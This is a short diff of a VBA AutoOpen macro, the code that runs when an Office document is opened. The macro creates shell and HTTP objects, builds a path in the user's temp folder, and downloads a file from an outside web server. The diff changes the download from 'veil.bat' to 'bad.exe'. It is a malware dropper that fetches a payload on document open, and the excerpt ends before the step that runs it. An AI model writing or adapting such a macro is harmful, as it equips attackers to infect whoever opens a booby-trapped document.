@@ -10,9 +10,9 @@ Sub AutoOpen()
     Dim objXMLHTTP As Object
     Set objshell = CreateObject("WScript.Shell")
     Set objFSO = CreateObject("Scripting.FileSystemObject")
-    strHDLocation = objshell.ExpandEnvironmentStrings("%temp%") & "\veil.bat" 
+    strHDLocation = objshell.ExpandEnvironmentStrings("%temp%") & "\bad.exe" 
     Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
-    objXMLHTTP.Open "GET", "https://somewebserver.com/veil.bat", False
+    objXMLHTTP.Open "GET", "https://somewebserver.com/bad.exe", False
     objXMLHTTP.send
      
     If objXMLHTTP.Status = 200 Then
